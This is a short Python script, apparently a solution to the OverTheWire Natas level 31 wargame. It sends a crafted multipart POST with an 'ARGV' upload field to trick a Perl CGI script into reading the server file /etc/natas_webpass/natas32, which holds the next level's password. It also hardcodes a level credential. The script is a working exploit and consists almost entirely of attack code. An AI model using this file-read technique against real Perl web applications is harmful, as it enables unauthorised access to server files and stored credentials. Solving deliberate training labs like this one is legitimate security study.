import requests
from requests.auth import HTTPBasicAuth

basicAuth = HTTPBasicAuth('natas31', 'aQzrirxwd2Wiaoq8HnSjcc8IUWlxdd1z')
url = "http://natas31.natas.labs.overthewire.org/index.pl?/etc/natas_webpass/natas32"

files = [
    ('file', (None, 'ARGV')),
    ('file', ('dummy.csv', '1,2,3\n')),
]

r = requests.post(url, auth=basicAuth, files=files)
print(r.text)